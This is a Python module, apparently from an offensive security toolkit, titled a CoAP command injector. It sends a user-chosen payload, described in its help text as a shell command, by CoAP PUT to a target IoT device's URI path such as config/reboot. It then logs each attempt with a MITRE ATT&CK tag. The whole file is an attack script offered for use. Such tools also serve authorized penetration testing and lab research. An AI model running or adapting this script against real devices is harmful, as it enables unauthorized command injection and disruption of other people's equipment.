# modules/exploits/coap_command_injector.py

import argparse
from datetime import datetime
import json
import os
from aiocoap import *

LOG_PATH = "results/exploit_logs.json"
MITRE_TTP = "T1210"  # Exploitation of Remote Services

def log_exploit(entry):
    os.makedirs("results", exist_ok=True)
    if os.path.exists(LOG_PATH):
        with open(LOG_PATH, "r") as f:
            data = json.load(f)
    else:
        data = []
    data.append(entry)
    with open(LOG_PATH, "w") as f:
        json.dump(data, f, indent=2)

async def exploit_coap(target, uri_path, payload):
    protocol = await Context.create_client_context()

    request = Message(code=PUT, payload=payload.encode())
    request.set_request_uri(f"coap://{target}/{uri_path}")

    try:
        response = await protocol.request(request).response
        print(f"[âœ“] Response: {response.payload.decode()}")
        success = True
    except Exception as e:
        print(f"[!] Failed to send CoAP payload: {e}")
        success = False

    log_exploit({
        "timestamp": datetime.utcnow().isoformat(),
        "target": target,
        "uri_path": uri_path,
        "payload": payload,
        "success": success,
        "ttp": MITRE_TTP
    })

if __name__ == "__main__":
    import asyncio
    parser = argparse.ArgumentParser(description="CoAP Command Injector")
    parser.add_argument("--target", required=True, help="Target IP (e.g., 192.168.0.10)")
    parser.add_argument("--uri", required=True, help="CoAP URI path (e.g., config/reboot)")
    parser.add_argument("--payload", required=True, help="Payload to inject (e.g., shell command)")
    args = parser.parse_args()

    asyncio.run(exploit_coap(args.target, args.uri, args.payload))
